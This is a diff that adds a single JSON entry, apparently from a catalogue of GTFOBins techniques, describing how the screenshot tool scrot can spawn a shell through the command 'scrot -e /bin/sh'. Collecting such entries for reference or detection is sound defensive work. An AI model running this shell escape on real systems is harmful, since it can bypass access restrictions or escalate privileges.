@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-scrot-shell",
+  "name": "GTFOBins · scrot (shell)",
+  "command": "scrot -e /bin/sh",
+  "description": "Use scrot to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "scrot",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/scrot/#shell",
+  "upstream_id": "scrot/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/scrot/"
+    }
+  ]
+}
